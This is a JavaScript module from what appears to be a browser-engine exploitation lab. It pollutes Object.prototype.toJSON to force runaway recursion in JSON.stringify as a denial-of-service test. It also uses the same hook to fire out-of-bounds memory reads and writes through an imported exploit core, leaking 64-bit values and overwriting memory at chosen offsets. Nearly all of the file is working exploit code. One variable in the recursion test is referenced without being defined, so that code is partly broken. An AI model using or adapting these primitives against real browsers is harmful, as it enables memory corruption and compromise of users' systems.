// js/json_exploit_test.mjs
import { log as appLog, PAUSE_LAB, toHexS1 } from './utils.mjs';
import * as Core from './core_exploit.mjs'; // Essencial para oob_read/write_relative
import { AdvancedInt64 } from './int64.mjs';
// import * as Groomer from './heap_groomer.mjs'; // Para usar Groomer.victim_object no futuro
// import { JSC_OFFSETS } from './config.mjs';    // Para offsets se mirar em campos específicos

const FNAME_BASE_JSON = "JsonExploitTest";

// --- Função para Testes de DoS por Recursão (Adaptado dos PoCs Isolados) ---
export async function runJsonRecursionTest(scenarioName) {
    const FNAME_RECURSION = `${FNAME_BASE_JSON}.runJsonRecursionTest[${scenarioName}]`;
    appLog(`--- Iniciando Teste de Recursão JSON: ${scenarioName} ---`, 'test', FNAME_RECURSION);

    let testObject;
    let recursionLimit = null; // null significa sem limite explícito
    let recursiveKeyBase = "RECURSIVE_KEY_";
    let useLongKeys = false;
    let longKeyLength = 100; // Comprimento padrão para "longas" se não especificado

    switch (scenarioName) {
        case 'scenario_poc_v23s_corrected': // Causa Estouro de Pilha
            testObject = { p1_s: "val_s1", p2_s: "val_s2", p3_s: { nested_s: true } };
            // Sem limite de recursão explícito aqui, depende do PoC original
            break;
        case 'scenario_poc_v23t_chaves_longas_lim50':
            testObject = { p1_t: "val_t1", p2_t: "val_t2" };
            recursionLimit = 50;
            useLongKeys = true;
            longKeyLength = 4000; // Como no PoC
            recursiveKeyBase = "X".repeat(longKeyLength) + "_KEY_";
            break;
        case 'scenario_poc_v23u_ultra_profundo':
            testObject = { p1_u: "val_u1" };
            recursionLimit = 2500;
            useLongKeys = true;
            longKeyLength = 4000;
            recursiveKeyBase = "Y".repeat(longKeyLength) + "_KEY_";
            break;
        case 'fallback':
        default:
            testObject = { simple: "fallback_data", val: 123 };
            recursionLimit = 5; // Limite baixo para o fallback não travar
            break;
    }

    const ppKey = 'toJSON';
    let originalToJSON_Descriptor;
    let ppAppliedSuccessfully = false;
    let callCount = 0;
    let errorState = null;
    let resultJSON = null;

    try {
        originalToJSON_Descriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        Object.prototype[ppKey] = function() {
            callCount++;
            let logPrefix = `toJSON_DoS (Call ${callCount}, Scenario: ${scenarioName})`;
            let thisIdentifier = "unknown";
            if (this === testObject && callCount === 1) thisIdentifier = "ROOT";
            else if (Array.isArray(this)) thisIdentifier = "ARRAY";
            else if (this && typeof this === 'object' && this.hasOwnProperty('level_t_long')) thisIdentifier = `PREV_RETURN_L${this.level_t_long}`;
            else if (this && typeof this === 'object' && this.hasOwnProperty('level_u')) thisIdentifier = `PREV_RETURN_L${this.level_u}`;
             else if (this && typeof this === 'object' && this.hasOwnProperty('final_structure_s')) thisIdentifier = "PREV_RETURN_S";


            const shouldLogThisCall = !recursionLimit || (callCount % (recursionLimit / 10) < 1) || (callCount === 1) || (callCount === recursionLimit) || (callCount_toJSON_u > recursionLimit && callCount_toJSON_u < recursionLimit + 3) ;

            if (shouldLogThisCall) {
                appLog(`${logPrefix} - INVOKED! id='${thisIdentifier}', typeof='${typeof this}', constructor='${this && this.constructor ? this.constructor.name : 'N/A'}'`, 'info', FNAME_RECURSION);
            }

            if (recursionLimit !== null && callCount > recursionLimit) {
                if (shouldLogThisCall || callCount === recursionLimit + 1) {
                    appLog(`${logPrefix} - Limite de recursão (${recursionLimit}) atingido. Retornando string.`, 'warn', FNAME_RECURSION);
                }
                return `recursion_limit_hit_at_${callCount}`;
            }

            let keys = [];
            try {
                keys = Object.keys(this);
                let keysToUse = keys;
                if (useLongKeys && thisIdentifier !== "ROOT") { // Aplica chaves longas para níveis recursivos
                    keysToUse = keys.map((k, idx) => `${recursiveKeyBase}${callCount}_${idx}`);
                }
                if (shouldLogThisCall) {
                    appLog(`${logPrefix} - Object.keys SUCESSO para id='${thisIdentifier}'. Usando chaves (amostra): [${keysToUse.slice(0,2).join(',').substring(0,30)}...]`, 'info', FNAME_RECURSION);
                }
                return { 
                    scenario_level: callCount,
                    payload_keys: keysToUse 
                };
            } catch (e) {
                appLog(`${logPrefix} - ERRO em Object.keys(this) para id='${thisIdentifier}': ${e.message}`, 'error', FNAME_RECURSION);
                return { "error_in_toJSON": String(e.message) };
            }
        };
        ppAppliedSuccessfully = true;
        appLog(`Poluição Object.prototype.toJSON APLICADA para teste de DoS (${scenarioName}).`, 'good', FNAME_RECURSION);

        appLog(`Tentando JSON.stringify em testObject para DoS... (PODE TRAVAR/FICAR LENTO)`, 'critical', FNAME_RECURSION);
        await PAUSE_LAB(50);
        resultJSON = JSON.stringify(testObject);

        appLog(`JSON.stringify (DoS Test) CONCLUÍDO (resultado pode ser grande). Chamadas toJSON: ${callCount}`, 'good', FNAME_RECURSION);
        if (resultJSON && resultJSON.length < 2000) appLog(resultJSON, 'info', FNAME_RECURSION);
        else if (resultJSON) appLog(`(Resultado JSON muito longo para logar aqui: ${resultJSON.length} chars)`, 'info', FNAME_RECURSION);


    } catch (e) {
        errorState = e;
        appLog(`ERRO CAPTURADO por JSON.stringify (DoS Test): ${e.message}. Chamadas toJSON: ${callCount}`, 'error', FNAME_RECURSION);
        if (e.stack) appLog(`Stack: ${e.stack}`, 'error', FNAME_RECURSION);
        console.error(`ERRO JSON DoS Test (${scenarioName}):`, e);
    } finally {
        if (ppAppliedSuccessfully) {
            if (originalToJSON_Descriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSON_Descriptor);
            else delete Object.prototype[ppKey];
            appLog(`Object.prototype.toJSON restaurado (DoS Test).`, 'good', FNAME_RECURSION);
        }
    }
    appLog(`--- Teste de Recursão JSON (${scenarioName}) Concluído ---`, 'test', FNAME_RECURSION);
}


// --- Função para JSON como Gatilho OOB ---
export async function jsonTriggeredOOBInteraction(objectToPassToJSON, relativeOOBOffset, valueToWrite, bytesToRead) {
    const FNAME_OOB_TRIGGER = `${FNAME_BASE_JSON}.jsonTriggeredOOBInteraction`;
    appLog(`--- Iniciando Cenário: JSON como Gatilho para Interação OOB ---`, 'test', FNAME_OOB_TRIGGER);
    appLog(`   Alvo inicial para JSON.stringify: ${objectToPassToJSON.constructor.name} (Tamanho: ${objectToPassToJSON.byteLength || 'N/A'})`, 'info', FNAME_OOB_TRIGGER);
    appLog(`   Offset OOB Relativo (no Core.oob_dataview_real): ${relativeOOBOffset} (0x${relativeOOBOffset.toString(16)})`, 'info', FNAME_OOB_TRIGGER);
    appLog(`   Valor para Escrita OOB: ${toHexS1(valueToWrite)}`, 'info', FNAME_OOB_TRIGGER);
    appLog(`   Bytes para Leitura OOB: ${bytesToRead}`, 'info', FNAME_OOB_TRIGGER);

    if (!Core.oob_dataview_real) {
        appLog("ERRO CRÍTICO: Core.oob_dataview_real (primitiva OOB) não está ativa!", "error", FNAME_OOB_TRIGGER);
        return;
    }

    const ppKey = 'toJSON';
    let originalToJSON_Descriptor;
    let ppAppliedSuccessfully = false;
    let oobInteractionPerformed = false;
    let resultJSON = null;
    let errorState = null;

    try {
        originalToJSON_Descriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        Object.prototype[ppKey] = function() {
            let logPrefix = `toJSON_OOBTrigger`;
            
            if (this === objectToPassToJSON) {
                appLog(`${logPrefix} - 'this' (${this.constructor.name}, Tam: ${this.byteLength || 'N/A'}) é o objeto alvo! Executando OOB...`, 'vuln', FNAME_OOB_TRIGGER);
                oobInteractionPerformed = true;
                let interactionResult = { oob_trigger_executed: true, offset_tested: relativeOOBOffset };

                try {
                    let leakedValue;
                    appLog(`${logPrefix}    Tentando ler ${bytesToRead} bytes OOB em offset relativo ${relativeOOBOffset}...`, 'info', FNAME_OOB_TRIGGER);
                    if (bytesToRead === 8) {
                        const low = Core.oob_read_relative(relativeOOBOffset, 4);
                        const high = Core.oob_read_relative(relativeOOBOffset + 4, 4);
                        leakedValue = new AdvancedInt64(low, high);
                        interactionResult.initial_val_type = "Int64";
                        interactionResult.initial_val = leakedValue.toString(true);
                        appLog(`${logPrefix}    Valor OOB Int64 lido: ${leakedValue.toString(true)}`, 'leak', FNAME_OOB_TRIGGER);
                    } else {
                        leakedValue = Core.oob_read_relative(relativeOOBOffset, bytesToRead);
                        interactionResult.initial_val_type = `Uint${bytesToRead*8}`;
                        interactionResult.initial_val = toHexS1(leakedValue, bytesToRead * 8);
                        appLog(`${logPrefix}    Valor OOB ${bytesToRead}-byte lido: ${toHexS1(leakedValue, bytesToRead * 8)}`, 'leak', FNAME_OOB_TRIGGER);
                    }

                    appLog(`${logPrefix}    Tentando escrever ${toHexS1(valueToWrite)} em offset OOB ${relativeOOBOffset}...`, 'info', FNAME_OOB_TRIGGER);
                    Core.oob_write_relative(relativeOOBOffset, valueToWrite, 4); // Assumindo escrita de 4 bytes (Uint32)
                    appLog(`${logPrefix}    Escrita OOB realizada.`, 'good', FNAME_OOB_TRIGGER);
                    interactionResult.written_val = toHexS1(valueToWrite);

                    const valueAfterWrite = Core.oob_read_relative(relativeOOBOffset, 4); // Lê 4 bytes para verificar
                    interactionResult.read_back_val_after_write = toHexS1(valueAfterWrite);
                    appLog(`${logPrefix}    Valor OOB lido em offset ${relativeOOBOffset} APÓS a escrita: ${toHexS1(valueAfterWrite)}`, 'leak', FNAME_OOB_TRIGGER);

                    if (valueAfterWrite === valueToWrite) {
                        appLog(`${logPrefix}    SUCESSO: Leitura após escrita OOB confirmou o valor!`, 'vuln', FNAME_OOB_TRIGGER);
                        interactionResult.write_confirmed = true;
                    } else {
                        appLog(`${logPrefix}    AVISO: Leitura após escrita OOB NÃO confirmou o valor. Lido: ${toHexS1(valueAfterWrite)}, Esperado: ${toHexS1(valueToWrite)}`, 'warn', FNAME_OOB_TRIGGER);
                        interactionResult.write_confirmed = false;
                    }
                    return interactionResult;

                } catch (e_oob) {
                    appLog(`${logPrefix}    ERRO durante operação OOB: ${e_oob.message}`, 'error', FNAME_OOB_TRIGGER);
                    console.error("Erro OOB no toJSON:", e_oob);
                    return { oob_trigger_error: String(e_oob.message) };
                }
            }
            // Fallback para outros 'this'
            return { processed_other_this_in_oob_trigger: true, type: typeof this };
        };
        ppAppliedSuccessfully = true;
        appLog(`Poluição Object.prototype.${ppKey} para Gatilho OOB aplicada.`, 'good', FNAME_OOB_TRIGGER);

        appLog(`Tentando JSON.stringify em objectToPassToJSON...`, 'info', FNAME_OOB_TRIGGER);
        await PAUSE_LAB(100); 
        resultJSON = JSON.stringify(objectToPassToJSON, null, 2); 
        
        appLog(`JSON.stringify (Gatilho OOB) CONCLUÍDO.`, 'good', FNAME_OOB_TRIGGER);
        if (resultJSON && resultJSON.length < 2000) appLog(resultJSON, 'info', FNAME_OOB_TRIGGER);
        else if (resultJSON) appLog(`(Resultado JSON Gatilho OOB muito longo: ${resultJSON.length} chars)`, 'info', FNAME_OOB_TRIGGER);


    } catch (e) {
        errorState = e;
        appLog(`Erro fatal durante Gatilho OOB via JSON: ${e.message}`, 'error', FNAME_OOB_TRIGGER);
        console.error("Erro Gatilho OOB via JSON:", e);
    } finally {
        if (ppAppliedSuccessfully) { 
            if (originalToJSON_Descriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSON_Descriptor);
            else delete Object.prototype[ppKey];
            appLog(`Object.prototype.${ppKey} restaurado.`, 'good', `${FNAME_OOB_TRIGGER}.Cleanup`);
        }
    }
    appLog(`--- Cenário: JSON como Gatilho OOB Concluído ---`, 'test', FNAME_OOB_TRIGGER);
}
